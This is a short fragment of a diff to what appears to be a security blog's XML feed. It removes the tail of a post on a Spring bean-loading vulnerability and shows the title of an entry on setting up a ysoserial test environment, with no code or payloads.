-                     data-src="/2025/03/15/spring%E6%A1%86%E6%9E%B6bean%E5%8A%A0%E8%BD%BD%E6%BC%8F%E6%B4%9E/image-20250315004447540.png"
-                      class="" title="image-20250315004447540"
-                > 
-
-
-
-
-
-
-
-
-
-
-
-]]></content>
-      <categories>
-        <category>漏洞原理分析</category>
-      </categories>
   </entry>
   <entry>
     <title>ysoserial测试环境搭建tips</title>
